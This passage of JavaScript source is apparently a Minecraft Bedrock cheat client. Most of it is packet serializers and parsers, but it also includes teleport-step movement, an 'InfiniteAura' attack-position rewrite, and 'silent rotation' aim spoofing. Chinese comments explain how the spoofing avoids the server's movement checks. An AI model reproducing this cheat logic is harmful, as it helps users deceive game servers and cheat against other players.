                y: y,
                z: z
            }
        });
        return;
    }
    for (let i = 1; i <= steps; i++) {
        sendPlayerAuthInput({
            pos: {
                x: self_pos.x + ((x - self_pos.x) / steps) * i,
                y: self_pos.y + ((y - self_pos.y) / steps) * i,
                z: self_pos.z + ((z - self_pos.z) / steps) * i
            }
        });
    }
    setEntityPos(self_id, x, y, z);
}

function InfiniteAura_attackEntity(TargetId, Swing, Pos) {
    InfiniteAura_RewriteAttackPos = Pos;
    return attackEntity(TargetId, Swing);
}

const setSilentRot = (pitch, yaw) => {
    let yaw2 = yaw - 180;
    if (pitch > 90) pitch -= 90;
    if (pitch < -90) pitch += 90;
    if (yaw2 > 180) yaw2 = yaw2 - 360;
    if (yaw2 < -180) yaw2 = 360 + yaw2;
    let RotData = {
        pitch: pitch,
        yaw: yaw2
    };
    SilentRot_data = RotData;
    Critical_SilentRot = RotData;
    return true;
}


const silentRot = (pitch, yaw, forceFull) => {
    let yaw2 = yaw - 180;
    if (pitch > 90) pitch -= 90;
    if (pitch < -90) pitch += 90;
    if (yaw2 > 180) yaw2 = yaw2 - 360;
    if (yaw2 < -180) yaw2 = 360 + yaw2;
    if (pitch > 90 || pitch < -90 || yaw2 > 180 || yaw2 < -180) {
        return false;
    }
    /* ① 朝向数据一律下发，与自己第几人称无关：
       服务端与其他客户端能看到的只有包里的 pitch/yaw/headYaw，
       只有这一层恒定，切换人称才不会再改变别人看到的画面。 */
    /* 覆盖 yaw(4) 的时机要挑：服务端按「上报朝向 + 移动输入」重算并校验
       走位，移动中把 yaw 改成目标方向，位移就会被算到目标方向的坐标系里
       —— 实测「一直往前推摇杆却往莫名其妙的方向走」就是它。
       静止时覆盖是安全的（移动输入为 0，与朝向无关）：整身转过去，完整自瞄；
       移动中只覆盖 headYaw(28)，头部照样转向目标，走位保持正常。 */
    /* forceFull 只标记「这次是投掷弹道」。能不能整身转不在这里定 —— 等改包那
       一步读了本包的移动向量再定（见 144 分支的 TU_AllowFullRot）。 */
    SilentRot_data = { pitch: pitch, yaw: yaw2, forceFull: !!forceFull };
    /* ② 本地只在第三人称动；第一人称一个字段都不写。 */
    if (_options.getPlayerViewPerspective() === 0) {
        return false;
    }
    /* ③ 移动中连本地实体朝向也不写：引擎在有移动输入时会按输入驱动本地玩家的
       rotation / headRotation，脚本每 tick 再写一遍就是两边争夺 —— 表现正是
       「移动时头部在目标与真实视角之间抽搐、停下就正常」。别人看到的头部只由
       包里的 headYaw 决定，不依赖这里的写入，所以少写它不会削弱自瞄。 */
    if (TU_LocalRotOff || (!TU_LocalRotInMove && !TU_IsStill())) {
        TU_ResetCamera();
        return false;
    }
    TU_DepartCamera();
    /* 只写两个不会被「输入 / 移动」每帧重算的量：
         · rotation.yaw/pitch —— 身体与世界朝向的来源；先把它写过去，
           头相对身体的夹角就是 0，头部才能真正对准目标（只写头会被 ±90° 卡住）；
         · headRotation        —— 头部水平朝向。
       刻意不写 bodyRotation：它由引擎按「移动方向」每帧驱动，脚本跟着写会在
       移动时与之争夺 —— 那正是「静止不抽、一动就抽」的来源。 */
    try {
        setEntityRotPrev(self_id, pitch, yaw2);
        if (!TU_HeadRotRenderOnly) setEntityRot(self_id, pitch, yaw2);
        setEntityHeadRotPrev(self_id, yaw2);
        if (!TU_HeadRotRenderOnly) setEntityHeadRot(self_id, yaw2);
    } catch (e) { }
    return true;
}

const encodeZigZag = (n) => (n << 1) ^ (n >> 31);

const writeVarInt32 = (packet, value) => {
    value |= 0;
    while ((value & 0xFFFFFF80) !== 0) {
        packet.writeUnsignedChar((value & 0x7F) | 0x80);
        value >>>= 7;
    }
    packet.writeUnsignedChar(value);
};

const writeVarInt64 = (packet, value) => {
    let val = BigInt(value);
    while (true) {
        const byte = Number(val & 0x7Fn);
        val >>= 7n;
        if (val === 0n) {
            packet.writeUnsignedChar(byte);
            break;
        }
        packet.writeUnsignedChar(byte | 0x80);
    }
};

function ParseSetActorData(data, isRestore = false) {
    if (isRestore) {
        let buffer = new ArrayBuffer(2048);
        let u8 = new Uint8Array(buffer);
        let dv = new DataView(buffer);
        let offset = 0;

        function writeByte(val) {
            u8[offset++] = val & 0xFF;
        }

        function writeInt16(val) {
            dv.setInt16(offset, val, true);
            offset += 2;
        }

        function writeFloat32(val) {
            let num = Number(val);
            dv.setFloat32(offset, isNaN(num) ? 0 : num, true);
            offset += 4;
        }

        function writeUVarInt(val) {
            val = Math.max(0, Number(val) || 0);
            do {
                let temp = val % 128;
                val = Math.floor(val / 128);
                if (val > 0) temp |= 0x80;
                u8[offset++] = temp;
            } while (val > 0);
        }

        function writeVarInt(value) {
            let val = BigInt(value || 0) & 0xFFFFFFFFFFFFFFFFn;
            do {
                let byte = Number(val & 0x7Fn);
                val >>= 7n;
                if (val !== 0n) byte |= 0x80;
                u8[offset++] = byte;
            } while (val !== 0n);
        }

        function writeString(str) {
            let strStr = str || "";
            let encoded = [];
            for (let i = 0; i < strStr.length; i++) {
                let codePoint = strStr.charCodeAt(i);
                if (codePoint >= 0xD800 && codePoint <= 0xDBFF && i + 1 < strStr.length) {
                    let next = strStr.charCodeAt(i + 1);
                    if (next >= 0xDC00 && next <= 0xDFFF) {
                        codePoint = (codePoint - 0xD800) * 0x400 + next - 0xDC00 + 0x10000;
                        i++;
                    }
                }
                if (codePoint < 0x80) {
                    encoded.push(codePoint);
                } else if (codePoint < 0x800) {
                    encoded.push(0xC0 | (codePoint >> 6));
                    encoded.push(0x80 | (codePoint & 0x3F));
                } else if (codePoint < 0x10000) {
                    encoded.push(0xE0 | (codePoint >> 12));
                    encoded.push(0x80 | ((codePoint >> 6) & 0x3F));
                    encoded.push(0x80 | (codePoint & 0x3F));
                } else {
                    encoded.push(0xF0 | (codePoint >> 18));
                    encoded.push(0x80 | ((codePoint >> 12) & 0x3F));
                    encoded.push(0x80 | ((codePoint >> 6) & 0x3F));
                    encoded.push(0x80 | (codePoint & 0x3F));
                }
            }
            writeUVarInt(encoded.length);
            for (let i = 0; i < encoded.length; i++) {
                u8[offset++] = encoded[i];
            }
        }

        writeVarInt(data.runtimeId);

        if (data.metadata && Array.isArray(data.metadata)) {
            writeUVarInt(data.metadata.length);
            for (let i = 0; i < data.metadata.length; i++) {
                let item = data.metadata[i];
                writeUVarInt(item.id);
                writeUVarInt(item.type);

                switch (item.type) {
                    case 0:
                        writeByte(item.value);
                        break;
                    case 1:
                        writeInt16(item.value);
                        break;
                    case 2:
                        let sval = Number(item.value) || 0;
                        writeUVarInt(sval >= 0 ? sval * 2 : (Math.abs(sval) * 2) - 1);
                        break;
                    case 3:
                        writeFloat32(item.value);
                        break;
                    case 4:
                        writeString(item.value);
                        break;
                    case 6:
                        let sx = Number(item.value.x) || 0;
                        writeUVarInt(sx >= 0 ? sx * 2 : (Math.abs(sx) * 2) - 1);
                        let sy = Number(item.value.y) || 0;
                        writeUVarInt(sy >= 0 ? sy * 2 : (Math.abs(sy) * 2) - 1);
                        let sz = Number(item.value.z) || 0;
                        writeUVarInt(sz >= 0 ? sz * 2 : (Math.abs(sz) * 2) - 1);
                        break;
                    case 7:
                        writeVarInt(item.value);
                        break;
                    case 8:
                        writeFloat32(item.value.x);
                        writeFloat32(item.value.y);
                        writeFloat32(item.value.z);
                        break;
                }
            }
        } else {
            writeUVarInt(0);
        }

        if (data.tick !== undefined && data.tick !== null) {
            writeUVarInt(data.tick);
        }

        return buffer.slice(0, offset);
    } else {
        let u8 = data instanceof Uint8Array ? data : new Uint8Array(data);
        let dv = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);
        let offset = 0;
        let len = u8.length;

        function readByte() {
            return offset < len ? u8[offset++] : 0;
        }

        function readInt16() {
            if (offset + 2 > len) return 0;
            let val = dv.getInt16(offset, true);
            offset += 2;
            return val;
        }

        function readFloat32() {
            if (offset + 4 > len) return 0;
            let val = dv.getFloat32(offset, true);
            offset += 4;
            if (val > -0.000001 && val < 0.000001) return 0;
            return Math.round(val * 1000000) / 1000000;
        }

        function readUVarInt() {
            let value = 0;
            let multiplier = 1;
            let byteData;
            do {
                if (offset >= len) break;
                byteData = u8[offset++];
                value += (byteData & 0x7F) * multiplier;
                multiplier *= 128;
            } while (byteData & 0x80);
            return value;
        }

        function readVarInt() {
            let value = 0n;
            let shift = 0n;
            let byte;
            do {
                if (offset >= len) break;
                byte = u8[offset++];
                value |= BigInt(byte & 0x7f) << shift;
                shift += 7n;
            } while (byte & 0x80);
            return value;
        }

        function readSVarInt() {
            let val = readUVarInt();
            let temp = Math.floor(val / 2);
            if (val % 2 !== 0) temp = -temp - 1;
            return temp;
        }

        function readString() {
            let strLen = readUVarInt();
            if (offset + strLen > len) return "";
            let end = offset + strLen;
            let res = [];
            while (offset < end) {
                let b1 = u8[offset++];
                if (b1 < 0x80) {
                    res.push(b1);
                } else if (b1 >= 0xC0 && b1 < 0xE0) {
                    let b2 = u8[offset++];
                    res.push(((b1 & 0x1F) << 6) | (b2 & 0x3F));
                } else if (b1 >= 0xE0 && b1 < 0xF0) {
                    let b2 = u8[offset++];
                    let b3 = u8[offset++];
                    res.push(((b1 & 0x0F) << 12) | ((b2 & 0x3F) << 6) | (b3 & 0x3F));
                } else if (b1 >= 0xF0 && b1 < 0xF8) {
                    let b2 = u8[offset++];
                    let b3 = u8[offset++];
                    let b4 = u8[offset++];
                    let cp = (((b1 & 0x07) << 18) | ((b2 & 0x3F) << 12) | ((b3 & 0x3F) << 6) | (b4 & 0x3F));
                    cp -= 0x10000;
                    res.push((cp >> 10) + 0xD800);
                    res.push((cp & 0x3FF) + 0xDC00);
                }
            }
            let finalStr = "";
            let chunk = 1000;
            for (let i = 0; i < res.length; i += chunk) {
                finalStr += String.fromCharCode.apply(null, res.slice(i, i + chunk));
            }
            return finalStr;
        }

        let result = {
            runtimeId: readVarInt().toString(),
            metadata: []
        };

        let count = readUVarInt();
        for (let i = 0; i < count; i++) {
            if (offset >= len) break;

            let id = readUVarInt();
            let type = readUVarInt();
            let value = null;

            switch (type) {
                case 0:
                    value = readByte();
                    break;
                case 1:
                    value = readInt16();
                    break;
                case 2:
                    value = readSVarInt();
                    break;
                case 3:
                    value = readFloat32();
                    break;
                case 4:
                    value = readString();
                    break;
                case 5:
                    break;
                case 6:
                    value = {
                        x: readSVarInt(),
                        y: readSVarInt(),
                        z: readSVarInt()
                    };
                    break;
                case 7:
                    value = readVarInt().toString();
                    break;
                case 8:
                    value = {
                        x: readFloat32(),
                        y: readFloat32(),
                        z: readFloat32()
                    };
                    break;
            }

            result.metadata.push({
                id: id,
                type: type,
                value: value
            });
        }

        if (offset < len) {
            result.tick = readUVarInt();
        }

        return result;
    }
}

function ParseUpdateAttributesPacket(data, isRestore = false) {
    if (isRestore) {
        let packet = [];

        const writeByte = (val) => {
            packet.push(Number(val) & 0xFF);
        };

        const writeUVarInt = (val) => {
            val = Number(val);
            if (val < 0) val = (val & 0xFFFFFFFF) >>> 0;
            /* 变长整数编码保护：非有限值归零 + 字节掩码 + 最多 10 字节，
               避免写出非法字节或陷入不终止的循环。 */
            if (!isFinite(val)) val = 0;
            for (let _tuG = 0; _tuG < 10; _tuG++) {
                let temp = val % 128;
                val = Math.floor(val / 128);
                if (val > 0) temp |= 0x80;
                packet.push(temp & 0xFF);
                if (val === 0) break;
            }
        };

        const writeUVarInt64 = (val) => {
            try {
                let v = BigInt(val);
                if (v < BigInt(0)) {
                    v = BigInt("18446744073709551616") + v;
                }
                do {
                    let temp = Number(v & BigInt(0x7F));
                    v = v >> BigInt(7);
                    if (v > BigInt(0)) temp |= 0x80;
                    packet.push(temp);
                } while (v > BigInt(0));
            } catch (e) {
                let v = Number(val);
                if (v < 0) v = v >>> 0;
                /* 变长整数编码保护：非有限值归零 + 字节掩码 + 最多 10 字节，
                   避免写出非法字节或陷入不终止的循环。 */
                if (!isFinite(v)) v = 0;
                for (let _tuG = 0; _tuG < 10; _tuG++) {
                    let temp = v % 128;
                    v = Math.floor(v / 128);
                    if (v > 0) temp |= 0x80;
                    packet.push(temp & 0xFF);
                    if (v === 0) break;
                }
            }
        };

        const writeFloat32 = (val) => {
            let buffer = new ArrayBuffer(4);
            new DataView(buffer).setFloat32(0, Number(val), true);
            let view = new Uint8Array(buffer);
            for (let i = 0; i < 4; i++) packet.push(view[i]);
        };

        const writeInt32 = (val) => {
            let buffer = new ArrayBuffer(4);
            new DataView(buffer).setInt32(0, Number(val), true);
            let view = new Uint8Array(buffer);
            for (let i = 0; i < 4; i++) packet.push(view[i]);
        };

        const writeString = (str) => {
            if (!str) str = "";
            let bytes = [];
            try {
                let utf8Str = unescape(encodeURIComponent(str));
                for (let i = 0; i < utf8Str.length; i++) {
                    bytes.push(utf8Str.charCodeAt(i));
                }
            } catch (e) {
                for (let i = 0; i < str.length; i++) {
                    bytes.push(str.charCodeAt(i) & 0xFF);
                }
            }
            writeUVarInt(bytes.length);
            for (let i = 0; i < bytes.length; i++) {
                writeByte(bytes[i]);
            }
        };

        writeUVarInt64(data.entityRuntimeId !== undefined ? data.entityRuntimeId : 0);

        let attributes = data.attributes || [];
        writeUVarInt(attributes.length);

        for (let i = 0; i < attributes.length; i++) {
            let attr = attributes[i];
            writeFloat32(attr.min !== undefined ? attr.min : 0);
            writeFloat32(attr.max !== undefined ? attr.max : 0);
            writeFloat32(attr.current !== undefined ? attr.current : 0);
            writeFloat32(attr.defaultMin !== undefined ? attr.defaultMin : 0);
            writeFloat32(attr.defaultMax !== undefined ? attr.defaultMax : 0);
            writeFloat32(attr.default !== undefined ? attr.default : 0);
            writeString(attr.name || "");

            let modifiers = attr.modifiers || [];
            writeUVarInt(modifiers.length);
            for (let j = 0; j < modifiers.length; j++) {
                let mod = modifiers[j];
                writeString(mod.id || "");
                writeString(mod.name || "");
                writeFloat32(mod.amount !== undefined ? mod.amount : 0);
                writeInt32(mod.operation !== undefined ? mod.operation : 0);
                writeInt32(mod.operand !== undefined ? mod.operand : 0);
                writeByte(mod.serializable ? 1 : 0);
            }
        }

        if (data.tick !== undefined) {
            writeUVarInt64(data.tick);
        }

        return new Uint8Array(packet).buffer;

    } else {
        let u8;
        try {
            u8 = new Uint8Array(data);
        } catch (e) {
            u8 = new Uint8Array(data.length);
            for (let idx = 0; idx < data.length; idx++) {
                u8[idx] = data[idx] & 0xFF;
            }
        }
        let offset = 0;
        let dv = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);

        const readByte = () => {
            if (offset >= u8.length) return 0;
            return u8[offset++];
        };

        const readUVarInt = () => {
            let value = 0;
            let multiplier = 1;
            let byteData;
            do {
                if (offset >= u8.length) break;
                byteData = u8[offset++];
                value += (byteData & 0x7F) * multiplier;
                multiplier *= 128;
            } while (byteData & 0x80);
            return value;
        };

        const readUVarInt64 = () => {
            try {
                let value = BigInt(0);
                let shift = BigInt(0);
                let byteData;
                do {
                    if (offset >= u8.length) break;
                    byteData = BigInt(u8[offset++]);
                    value += (byteData & BigInt(0x7F)) << shift;
                    shift += BigInt(7);
                } while (byteData & BigInt(0x80));
                return value.toString();
            } catch (e) {
                let value = 0;
                let shift = 0;
                let byteData;
                do {
                    if (offset >= u8.length) break;
                    byteData = u8[offset++];
                    value += (byteData & 0x7F) * Math.pow(2, shift);
                    shift += 7;
                } while (byteData & 0x80);
                return value;
            }
        };

        const readFloat32 = () => {
            if (offset + 4 > u8.length) {
                offset = u8.length;
                return 0;
            }
            let val = dv.getFloat32(offset, true);
            offset += 4;
            return val;
        };

        const readInt32 = () => {
            if (offset + 4 > u8.length) {
                offset = u8.length;
                return 0;
            }
            let val = dv.getInt32(offset, true);
            offset += 4;
            return val;
        };

        const readString = () => {
            let len = readUVarInt();
            if (offset + len > u8.length) len = u8.length - offset;
            let strBytes = [];
            for (let i = 0; i < len; i++) {
                strBytes.push(readByte());
            }
            let str = "";
            for (let i = 0; i < strBytes.length;) {
                let c = strBytes[i++];
                if (c < 128) {
                    str += String.fromCharCode(c);
                } else if (c > 191 && c < 224) {
                    let c2 = strBytes[i++];
                    str += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                } else if (c > 223 && c < 240) {
                    let c2 = strBytes[i++];
                    let c3 = strBytes[i++];
                    str += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                } else {
                    let c2 = strBytes[i++];
                    let c3 = strBytes[i++];
                    let c4 = strBytes[i++];
                    let pt = (((c & 7) << 18) | ((c2 & 63) << 12) | ((c3 & 63) << 6) | (c4 & 63)) - 0x10000;
                    str += String.fromCharCode(0xD800 + (pt >> 10), 0xDC00 + (pt & 0x3FF));
                }
            }
            return str;
        };

        let result = {};

        result.entityRuntimeId = readUVarInt64();
        result.attributes = [];

        let attrCount = readUVarInt();

        for (let i = 0; i < attrCount; i++) {
            let attr = {};
            attr.min = readFloat32();
            attr.max = readFloat32();
            attr.current = readFloat32();
            attr.defaultMin = readFloat32();
            attr.defaultMax = readFloat32();
            attr.default = readFloat32();
            attr.name = readString();

            attr.modifiers = [];
            let modCount = readUVarInt();
            for (let j = 0; j < modCount; j++) {
                let mod = {};
                mod.id = readString();
                mod.name = readString();
                mod.amount = readFloat32();
                mod.operation = readInt32();
                mod.operand = readInt32();
                mod.serializable = readByte() === 1;
                attr.modifiers.push(mod);
            }
            result.attributes.push(attr);
        }

        if (offset < u8.length) {
            result.tick = readUVarInt64();
        }

        return result;
    }
}

function ParseMovePlayer(data, isRestore) {
    if (isRestore) {
        let out = [];

        function writeVarInt(value) {
            let val = BigInt(value) & 0xFFFFFFFFFFFFFFFFn;
            do {
                let byte = Number(val & 0x7Fn);
                val >>= 7n;
                if (val !== 0n) {
                    byte |= 0x80;
                }
                out.push(byte);
            } while (val !== 0n);
        }

        let f32Buffer = new ArrayBuffer(4);
        let f32View = new DataView(f32Buffer);
        let u8View = new Uint8Array(f32Buffer);

        function writeFloat32(val) {
            f32View.setFloat32(0, Number(val), true);
            for (let i = 0; i < 4; i++) out.push(u8View[i]);
        }

        function writeInt32(val) {
            f32View.setInt32(0, Number(val), true);
            for (let i = 0; i < 4; i++) out.push(u8View[i]);
        }

        writeVarInt(data.runtimeId);
        writeFloat32(data.pos.x);
        writeFloat32(data.pos.y);
        writeFloat32(data.pos.z);
        writeFloat32(data.rot.pitch);
        writeFloat32(data.rot.yaw);
        writeFloat32(data.rot.headYaw);

        out.push(Number(data.mode) & 0xFF);
        out.push(data.onGround ? 1 : 0);

        writeVarInt(data.ridingEid);

        if (data.teleportCause !== undefined && data.teleportCause !== null) {
            writeInt32(data.teleportCause);
        }
        if (data.teleportItem !== undefined && data.teleportItem !== null) {
            writeInt32(data.teleportItem);
        }
        if (data.tick !== undefined && data.tick !== null) {
            writeVarInt(data.tick);
        }

        return new Uint8Array(out).buffer;
    } else {
        let u8 = data instanceof Uint8Array ? data : new Uint8Array(data);
        let view = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);
        let offset = 0;

        function readVarInt() {
            let value = 0n;
            let shift = 0n;
            let byte;
            do {
                if (offset >= u8.length) break;
                byte = u8[offset++];
                value |= BigInt(byte & 0x7f) << shift;
                shift += 7n;
            } while (byte & 0x80);
            return value;
        }

        let runtimeId = readVarInt();

        let x = view.getFloat32(offset, true);
        offset += 4;
        let y = view.getFloat32(offset, true);
        offset += 4;
        let z = view.getFloat32(offset, true);
        offset += 4;
        let pitch = view.getFloat32(offset, true);
        offset += 4;
        let yaw = view.getFloat32(offset, true);
        offset += 4;
        let headYaw = view.getFloat32(offset, true);
        offset += 4;

        let mode = u8[offset++];
        let onGround = u8[offset++] !== 0;
        let ridingEid = readVarInt();

        let cause = 0;
        let item = 0;
        let tick = 0n;

        if (offset + 4 <= u8.length) {
            cause = view.getInt32(offset, true);
            offset += 4;
        }
        if (offset + 4 <= u8.length) {
            item = view.getInt32(offset, true);
            offset += 4;
        }
        if (offset < u8.length) {
            tick = readVarInt();
        }

        return {
            runtimeId: runtimeId.toString(),
            pos: {
                x: x,
                y: y,
                z: z
            },
            rot: {
                pitch: pitch,
                yaw: yaw,
                headYaw: headYaw
            },
            mode: mode,
            onGround: onGround,
            ridingEid: ridingEid.toString(),
            teleportCause: cause,
            teleportItem: item,
            tick: tick.toString()
        };
    }
}

function ParseMoveActorDelta(data, isRestore = false) {
    if (isRestore) {
        let buffer = new ArrayBuffer(128);
        let u8 = new Uint8Array(buffer);
        let dv = new DataView(buffer);
        let offset = 0;

        function writeVarInt(value) {
            let val = BigInt(value || 0) & 0xFFFFFFFFFFFFFFFFn;
            do {
                let byte = Number(val & 0x7Fn);
                val >>= 7n;
                if (val !== 0n) byte |= 0x80;
                u8[offset++] = byte;
            } while (val !== 0n);
        }

        function writeFloat32(val) {
            let num = Number(val);
            dv.setFloat32(offset, isNaN(num) ? 0 : num, true);
            offset += 4;
        }

        function writeByte(val) {
            u8[offset++] = Number(val) & 0xFF;
        }

        function writeUint16(val) {
            dv.setUint16(offset, Number(val) || 0, true);
            offset += 2;
        }

        writeVarInt(data.runtimeId);

        let flags = 0;
        if (data.x !== undefined) flags |= 0x01;
        if (data.y !== undefined) flags |= 0x02;
        if (data.z !== undefined) flags |= 0x04;
        if (data.pitch !== undefined) flags |= 0x08;
        if (data.yaw !== undefined) flags |= 0x10;
        if (data.headYaw !== undefined) flags |= 0x20;

        writeUint16(flags);

        if (flags & 0x01) writeFloat32(data.x);
        if (flags & 0x02) writeFloat32(data.y);
        if (flags & 0x04) writeFloat32(data.z);

        if (flags & 0x08) writeByte(Math.floor((data.pitch / 360) * 256));
        if (flags & 0x10) writeByte(Math.floor((data.yaw / 360) * 256));
        if (flags & 0x20) writeByte(Math.floor((data.headYaw / 360) * 256));

        return buffer.slice(0, offset);
    } else {
        let u8 = data instanceof Uint8Array ? data : new Uint8Array(data);
        let view = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);
        let offset = 0;
        let len = u8.length;

        function readVarInt() {
            let value = 0n;
            let shift = 0n;
            let byte;
            do {
                if (offset >= len) break;
                byte = u8[offset++];
                value |= BigInt(byte & 0x7f) << shift;
                shift += 7n;
            } while (byte & 0x80);
            return value;
        }

        function readFloat32() {
            if (offset + 4 > len) return 0;
            let val = view.getFloat32(offset, true);
            offset += 4;
            if (val > -0.000001 && val < 0.000001) return 0;
            return Math.round(val * 1000000) / 1000000;
        }

        function readByte() {
            return offset < len ? u8[offset++] : 0;
        }

        function readUint16() {
            if (offset + 2 > len) return 0;
            let val = view.getUint16(offset, true);
            offset += 2;
            return val;
        }

        let runtimeId = readVarInt();
        let flags = readUint16();

        let result = {
            runtimeId: runtimeId.toString()
        };

        if (flags & 0x01) result.x = readFloat32();
        if (flags & 0x02) result.y = readFloat32();
        if (flags & 0x04) result.z = readFloat32();

        if (flags & 0x08) result.pitch = (readByte() * 360) / 256;
        if (flags & 0x10) result.yaw = (readByte() * 360) / 256;
        if (flags & 0x20) result.headYaw = (readByte() * 360) / 256;

        return result;
    }
}

function ParseSetActorMotion(data, isRestore = false) {
    if (isRestore) {
        let buffer = new ArrayBuffer(64);
        let u8 = new Uint8Array(buffer);
        let dv = new DataView(buffer);
        let offset = 0;

        function writeVarInt(value) {
            let val = BigInt(value || 0) & 0xFFFFFFFFFFFFFFFFn;
            do {
                let byte = Number(val & 0x7Fn);
                val >>= 7n;
                if (val !== 0n) byte |= 0x80;
                u8[offset++] = byte;
            } while (val !== 0n);
        }

        function writeFloat32(val) {
            let num = Number(val);
            dv.setFloat32(offset, isNaN(num) ? 0 : num, true);
            offset += 4;
        }

        writeVarInt(data.runtimeId);
        writeFloat32(data.motion ? data.motion.x : 0);
        writeFloat32(data.motion ? data.motion.y : 0);
        writeFloat32(data.motion ? data.motion.z : 0);

        if (data.tick !== undefined && data.tick !== null) {
            writeVarInt(data.tick);
        }

        return buffer.slice(0, offset);
    } else {
        let u8 = data instanceof Uint8Array ? data : new Uint8Array(data);
        let view = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);
        let offset = 0;
        let len = u8.length;

        function readVarInt() {
            let value = 0n;
            let shift = 0n;
            let byte;
            do {
                if (offset >= len) break;
                byte = u8[offset++];
                value |= BigInt(byte & 0x7f) << shift;
                shift += 7n;
            } while (byte & 0x80);
            return value;
        }

        function readFloat32() {
            if (offset + 4 > len) return 0;
            let val = view.getFloat32(offset, true);
            offset += 4;
            if (val > -0.000001 && val < 0.000001) return 0;
            return Math.round(val * 1000000) / 1000000;
        }

        let runtimeId = readVarInt();
        let motion = {
            x: readFloat32(),
            y: readFloat32(),
            z: readFloat32()
        };

        let result = {
            runtimeId: runtimeId.toString(),
            motion: motion
        };

        if (offset < len) {
            result.tick = readVarInt().toString();
        }

        return result;
    }
}

function ParseActorEventPacket(data, isRestore = false) {
    if (isRestore) {
        let packet = [];

        const writeByte = (val) => {
            packet.push(Number(val) & 0xFF);
        };

        const writeUVarInt = (val) => {
            if (val < 0) val = val >>> 0;
            /* 变长整数编码保护：非有限值归零 + 字节掩码 + 最多 10 字节，
               避免写出非法字节或陷入不终止的循环。 */
            if (!isFinite(val)) val = 0;
            for (let _tuG = 0; _tuG < 10; _tuG++) {
                let temp = val % 128;
                val = Math.floor(val / 128);
                if (val > 0) temp |= 0x80;
                packet.push(temp & 0xFF);
                if (val === 0) break;
            }
        };

        const writeSVarInt = (val) => {
            let uval = val >= 0 ? val * 2 : (Math.abs(val) * 2) - 1;
            writeUVarInt(uval);
        };

        const writeUVarInt64 = (val) => {
            try {
                let v = BigInt(val);
                if (v < BigInt(0)) {
                    v = BigInt("18446744073709551616") + v;
                }
                do {
                    let temp = Number(v & BigInt(0x7F));
                    v = v >> BigInt(7);
                    if (v > BigInt(0)) temp |= 0x80;
                    packet.push(temp);
                } while (v > BigInt(0));
            } catch (e) {
                let v = Number(val);
                if (v < 0) v = v >>> 0;
                /* 变长整数编码保护：非有限值归零 + 字节掩码 + 最多 10 字节，
                   避免写出非法字节或陷入不终止的循环。 */
                if (!isFinite(v)) v = 0;
                for (let _tuG = 0; _tuG < 10; _tuG++) {
                    let temp = v % 128;
                    v = Math.floor(v / 128);
                    if (v > 0) temp |= 0x80;
                    packet.push(temp & 0xFF);
                    if (v === 0) break;
                }
            }
        };

        writeUVarInt64(data.entityRuntimeId !== undefined ? data.entityRuntimeId : 0);
        writeByte(data.eventId !== undefined ? data.eventId : 0);
        writeSVarInt(data.eventData !== undefined ? data.eventData : 0);

        return new Uint8Array(packet).buffer;

    } else {
        let u8;
        try {
            u8 = new Uint8Array(data);
        } catch (e) {
            u8 = new Uint8Array(data.length);
            for (let idx = 0; idx < data.length; idx++) {
                u8[idx] = data[idx] & 0xFF;
            }
        }
        let offset = 0;

        const readByte = () => {
            if (offset >= u8.length) return 0;
            return u8[offset++];
        };

        const readUVarInt = () => {
            let value = 0;
            let shift = 0;
            let byteData;
            do {
                if (offset >= u8.length) break;
                byteData = u8[offset++];
                value += (byteData & 0x7F) * Math.pow(2, shift);
                shift += 7;
            } while (byteData & 0x80);
            return value;
        };

        const readSVarInt = () => {
            let value = readUVarInt();
            let temp = Math.floor(value / 2);
            if (value % 2 !== 0) {
                temp = -temp - 1;
            }
            return temp;
        };

        const readUVarInt64 = () => {
            try {
                let value = BigInt(0);
                let shift = BigInt(0);
                let byteData;
                do {
                    if (offset >= u8.length) break;
                    byteData = BigInt(u8[offset++]);
                    value += (byteData & BigInt(0x7F)) << shift;
                    shift += BigInt(7);
                } while (byteData & BigInt(0x80));
                return value.toString();
            } catch (e) {
                let value = 0;
                let shift = 0;
                let byteData;
                do {
                    if (offset >= u8.length) break;
                    byteData = u8[offset++];
                    value += (byteData & 0x7F) * Math.pow(2, shift);
                    shift += 7;
                } while (byteData & 0x80);
                return value;
            }
        };

        let result = {};

        result.entityRuntimeId = readUVarInt64();
        result.eventId = readByte();
        result.eventData = readSVarInt();

        return result;
    }
}

function ParseInteractPacket(data, isRestore = false) {
    if (isRestore) {
        let packet = [];

        function writeByte(val) {
            packet.push(val & 0xFF);
        }

        function writeUVarInt(val) {
            let v = typeof val === 'bigint' ? val : BigInt(val);
            if (v < 0n) v = BigInt.asUintN(64, v);
            do {
                let temp = Number(v & 0x7Fn);
                v = v >> 7n;
                if (v > 0n) temp |= 0x80;
                packet.push(temp);
            } while (v > 0n);
        }

        function writeFloat(val) {
            let buf = new ArrayBuffer(4);
            new DataView(buf).setFloat32(0, val, true);
            let u8 = new Uint8Array(buf);
            for (let i = 0; i < 4; i++) packet.push(u8[i]);
        }

        writeByte(data.action || 0);
        writeUVarInt(data.targetRuntimeId || 0n);

        if (data.action === 1 || data.action === 4) {
            if (data.pos) {
                writeFloat(data.pos.x || 0);
                writeFloat(data.pos.y || 0);
                writeFloat(data.pos.z || 0);
            } else {
                writeFloat(0);
                writeFloat(0);
                writeFloat(0);
            }
        }

        return new Uint8Array(packet).buffer;

    } else {
        let u8;
        try {
            u8 = new Uint8Array(data);
        } catch (e) {
            u8 = new Uint8Array(data.length);
            for (let idx = 0; idx < data.length; idx++) {
                u8[idx] = data[idx] & 0xFF;
            }
        }
        let offset = 0;
        let dv = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);

        function readByte() {
            if (offset >= u8.length) return 0;
            return u8[offset++];
        }

        function readUVarInt() {
            let value = 0n;
            let shift = 0n;
            let byteData;
            do {
                if (offset >= u8.length) break;
                byteData = u8[offset++];
                value |= BigInt(byteData & 0x7F) << shift;
                shift += 7n;
            } while (byteData & 0x80);
            return value;
        }

        function readFloat() {
            if (offset + 4 > u8.length) return 0;
            let val = dv.getFloat32(offset, true);
            offset += 4;
            return val;
        }

        let result = {};

        result.action = readByte();
        result.targetRuntimeId = readUVarInt().toString();

        if (result.action === 1 || result.action === 4) {
            result.pos = {
                x: readFloat(),
                y: readFloat(),
                z: readFloat()
            };
        }

        return result;
    }
}

